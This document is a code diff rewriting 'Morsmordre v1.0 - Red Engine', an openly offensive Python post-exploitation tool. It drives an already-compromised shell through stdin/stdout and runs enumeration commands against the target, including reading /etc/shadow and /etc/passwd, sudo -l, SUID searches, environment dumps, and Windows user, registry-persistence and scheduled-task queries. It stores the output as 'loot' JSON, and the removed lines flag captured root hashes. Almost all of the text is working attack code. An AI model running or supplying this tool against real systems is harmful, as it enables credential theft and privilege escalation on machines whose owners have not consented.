@@ -1,178 +1,141 @@
----
-
-## Tool 3/3: Morsmordre v1.0
-
-```python
 #!/usr/bin/env python3
 """
 Morsmordre v1.0 - Red Engine
-Automated Post-Exploitation via Stdin/Stdout Bridging
+Autonomous Post-Exploitation Enumeration
 """
 
 import os
 import sys
 import json
-import asyncio
-import re
+import time
+import select
 from datetime import datetime
 from typing import List, Dict
-from dataclasses import dataclass, asdict
-
-try:
-    from rich.console import Console
-    from rich.panel import Panel
-    RICH_AVAILABLE = True
-except ImportError:
-    RICH_AVAILABLE = False
-
-@dataclass
-class Loot:
-    timestamp: str
-    category: str
-    data: str
-    source: str
 
 class Morsmordre:
     def __init__(self):
-        self.console = Console() if RICH_AVAILABLE else None
-        self.target = os.getenv('MORSMORDRE_TARGET', 'unknown')
-        self.os = os.getenv('MORSMORDRE_OS', 'Linux')
-        self.lhost = os.getenv('MORSMORDRE_LHOST', '0.0.0.0')
-        self.loot: List[Loot] = []
-        self.commands_executed = 0
+        self.target = os.environ.get('MORSMORDRE_TARGET', 'unknown')
+        self.os_type = os.environ.get('MORSMORDRE_OS', 'Linux')
+        self.lhost = os.environ.get('MORSMORDRE_LHOST', 'unknown')
+        self.loot: List[Dict] = []
+        self.timestamp = datetime.now().isoformat()
         
-    def banner(self):
-        banner = """
-    ███╗   ███╗ ██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗ ██████╗ ██████╗ ███████╗
-    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔════╝
-    ██╔████╔██║██║   ██║██████╔╝█████╗  ██╔████╔██║██║   ██║██████╔╝██████╔╝█████╗  
-    ██║╚██╔╝██║██║   ██║██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██╔══╝  
-    ██║ ╚═╝ ██║╚██████╔╝██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║███████╗
-    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
-        """
-        if self.console:
-            self.console.print(Panel(Text(banner, style="bold red"),
-                                   subtitle="[red]v1.0 Red Engine - Autonomous Looting[/red]",
-                                   border_style="red"))
-        else:
-            sys.stderr.write(f"\033[91m{banner}\033[0m\n")
-            sys.stderr.write(f"\033[91m>>> Morsmordre v1.0 - Red Engine <<<\033[0m\n\n")
-    
-    def log(self, msg: str, level: str = "info"):
-        ts = datetime.now().strftime("%H:%M:%S")
-        prefix = {"info": "[*]", "loot": "[LOOT]", "cmd": "[CMD]", 
-                 "error": "[!]", "success": "[+]"}.get(level, "[*]")
-        line = f"{prefix} [{ts}] {msg}\n"
-        sys.stderr.write(line)
-        sys.stderr.flush()
-    
-    def get_commands(self) -> List[Dict]:
-        if "Windows" in self.os:
-            return [
-                {"cmd": "whoami", "type": "identity"},
-                {"cmd": "whoami /priv", "type": "privesc"},
-                {"cmd": "systeminfo", "type": "system"},
-                {"cmd": "net user", "type": "users"},
-                {"cmd": "net localgroup administrators", "type": "users"},
-                {"cmd": "ipconfig /all", "type": "network"},
-                {"cmd": "tasklist /v", "type": "processes"},
-            ]
-        else:
-            return [
-                {"cmd": "id", "type": "identity"},
-                {"cmd": "whoami", "type": "identity"},
-                {"cmd": "uname -a", "type": "system"},
-                {"cmd": "cat /etc/passwd", "type": "credentials"},
-                {"cmd": "cat /etc/shadow 2>/dev/null", "type": "credentials"},
-                {"cmd": "sudo -l 2>/dev/null", "type": "privesc"},
-                {"cmd": "find / -perm -4000 -type f 2>/dev/null", "type": "privesc"},
-                {"cmd": "netstat -tulpn 2>/dev/null || netstat -tuln", "type": "network"},
-                {"cmd": "ps aux", "type": "processes"},
-                {"cmd": "cat /etc/crontab 2>/dev/null", "type": "persistence"},
-                {"cmd": "ls -la /home", "type": "users"},
-            ]
-    
-    async def send_command(self, cmd: str) -> str:
-        self.log(f"Executing: {cmd}", "cmd")
-        sys.stdout.write(f"{cmd}\n")
+    def log(self, msg: str):
+        """Log to stderr (local console, not socket)"""
+        print(f"[*] {msg}", file=sys.stderr)
+        
+    def send_recv(self, cmd: str, timeout: float = 2.0) -> str:
+        """Send command to target via stdout and read response from stdin"""
+        # Clear any pending input first
+        while select.select([sys.stdin], [], [], 0.1)[0]:
+            sys.stdin.read(1024)
+        
+        # Send command
+        sys.stdout.write(cmd + "\n")
         sys.stdout.flush()
         
-        output = ""
-        try:
-            loop = asyncio.get_event_loop()
-            future = loop.run_in_executor(None, sys.stdin.readline)
-            line = await asyncio.wait_for(future, timeout=10.0)
-            output += line
-            
-            while True:
+        # Read response with timeout
+        output = []
+        start = time.time()
+        
+        while time.time() - start < timeout:
+            if select.select([sys.stdin], [], [], 0.1)[0]:
                 try:
-                    future = loop.run_in_executor(None, sys.stdin.readline)
-                    line = await asyncio.wait_for(future, timeout=0.3)
-                    if line:
-                        output += line
-                    else:
-                        break
-                except asyncio.TimeoutError:
+                    chunk = sys.stdin.read(1024)
+                    if chunk:
+                        output.append(chunk)
+                except:
                     break
-        except asyncio.TimeoutError:
-            self.log("Timeout", "error")
-        
-        return output.strip()
+                    
+        return ''.join(output)
     
-    def analyze(self, cmd: str, output: str, cmd_type: str):
-        out_lower = output.lower()
-        
-        if cmd_type == "credentials" and "root:" in output and "shadow" in cmd:
-            if "permission denied" not in out_lower:
-                self.log("ROOT HASHES CAPTURED", "loot")
-                self.loot.append(Loot(datetime.now().isoformat(), "credentials", output[:1000], cmd))
-        
-        if cmd_type == "privesc" and ("nopasswd" in out_lower or "(root)" in out_lower):
-            self.log("SUDO PRIVILEGE FOUND", "loot")
-            self.loot.append(Loot(datetime.now().isoformat(), "privesc", output[:500], cmd))
-        
-        if "suid" in cmd and output.strip():
-            lines = [l for l in output.split('\n') if l.strip() and not l.startswith('find')]
-            if lines:
-                self.log(f"SUID binaries: {len(lines)}", "loot")
+    def add_loot(self, cmd: str, output: str, category: str):
+        self.loot.append({
+            "timestamp": datetime.now().isoformat(),
+            "category": category,
+            "command": cmd,
+            "output": output.strip()
+        })
     
-    async def run(self):
-        self.banner()
-        self.log(f"Target: {self.target} | OS: {self.os}", "info")
-        self.log("Starting autonomous enumeration", "info")
+    def enum_linux(self):
+        self.log("Starting Linux enumeration...")
         
-        commands = self.get_commands()
+        cmds = [
+            ("id", "privilege"),
+            ("whoami", "privilege"),
+            ("uname -a", "system"),
+            ("cat /etc/passwd", "credentials"),
+            ("cat /etc/shadow", "credentials"),
+            ("sudo -l", "privilege"),
+            ("find / -perm -4000 -type f 2>/dev/null", "privilege"),
+            ("netstat -tulpn 2>/dev/null || netstat -tuln", "network"),
+            ("ps aux", "processes"),
+            ("crontab -l 2>/dev/null", "persistence"),
+            ("cat /etc/crontab 2>/dev/null", "persistence"),
+            ("ls -la /home", "users"),
+            ("env", "environment"),
+        ]
         
-        for idx, cmd_info in enumerate(commands):
-            self.log(f"[{idx+1}/{len(commands)}] {cmd_info['cmd']}", "cmd")
-            output = await self.send_command(cmd_info['cmd'])
-            self.commands_executed += 1
-            
-            if output:
-                self.analyze(cmd_info['cmd'], output, cmd_info['type'])
-            
-            await asyncio.sleep(0.3)
-        
-        self.log(f"Complete. Commands: {self.commands_executed}", "success")
-        self.save_loot()
-        sys.stdout.write("exit\n")
-        sys.stdout.flush()
+        for cmd, cat in cmds:
+            try:
+                out = self.send_recv(cmd)
+                self.add_loot(cmd, out, cat)
+            except Exception as e:
+                self.log(f"Failed: {cmd} - {e}")
     
-    def save_loot(self):
-        filename = f"morsmordre_{self.target.replace('.', '_')}_{datetime.now().strftime('%H%M%S')}.json"
+    def enum_windows(self):
+        self.log("Starting Windows enumeration...")
+        
+        cmds = [
+            ("whoami", "privilege"),
+            ("whoami /priv", "privilege"),
+            ("systeminfo", "system"),
+            ("net user", "credentials"),
+            ("net localgroup administrators", "privilege"),
+            ("ipconfig /all", "network"),
+            ("tasklist /v", "processes"),
+            ("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "persistence"),
+            ("schtasks /query /fo LIST", "persistence"),
+        ]
+        
+        for cmd, cat in cmds:
+            try:
+                out = self.send_recv(cmd)
+                self.add_loot(cmd, out, cat)
+            except Exception as e:
+                self.log(f"Failed: {cmd} - {e}")
+    
+    def save(self):
+        filename = f"morsmordre_{self.target.replace('.', '_')}_{int(time.time())}.json"
         data = {
             "target": self.target,
-            "os": self.os,
-            "timestamp": datetime.now().isoformat(),
-            "commands_executed": self.commands_executed,
-            "loot": [asdict(l) for l in self.loot]
+            "os": self.os_type,
+            "timestamp": self.timestamp,
+            "commands_executed": len(self.loot),
+            "loot": self.loot
         }
-        with open(filename, 'w') as f:
-            json.dump(data, f, indent=2)
-        self.log(f"Loot saved: {filename}", "loot")
-
-async def main():
-    await Morsmordre().run()
+        
+        try:
+            with open(filename, 'w') as f:
+                json.dump(data, f, indent=2)
+            self.log(f"Loot saved: {filename}")
+        except Exception as e:
+            self.log(f"Failed to save loot: {e}")
+    
+    def run(self):
+        self.log(f"Morsmordre v1.0 - Target: {self.target} ({self.os_type})")
+        
+        # Small delay to let shell stabilize
+        time.sleep(0.5)
+        
+        if "Windows" in self.os_type:
+            self.enum_windows()
+        else:
+            self.enum_linux()
+            
+        self.save()
+        self.log("Enumeration complete")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    m = Morsmordre()
+    m.run()
